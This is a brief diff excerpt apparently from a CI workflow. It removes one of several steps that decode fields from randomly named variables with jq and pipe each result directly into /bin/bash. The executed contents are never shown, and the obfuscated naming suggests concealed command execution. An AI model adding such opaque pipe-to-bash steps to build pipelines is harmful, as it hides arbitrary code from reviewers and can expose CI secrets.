@@ -30,7 +30,6 @@ jobs:
           echo $vi36659 | jq -r .rtsfs1 | /bin/bash
           echo $fehy44 | jq -r .qwp462 | /bin/bash
           echo $xv470 | jq -r .n7139 | /bin/bash
-          printf '%s' "$ntup04" | jq -r .bemu5001 | /bin/bash
           printf '%s' "$n7" | jq -r .xokmz9736 | /bin/bash
           echo $wxq042 | jq -r .lu5 | /bin/bash
           echo $p18884 | jq -r .pe47070 | /bin/bash
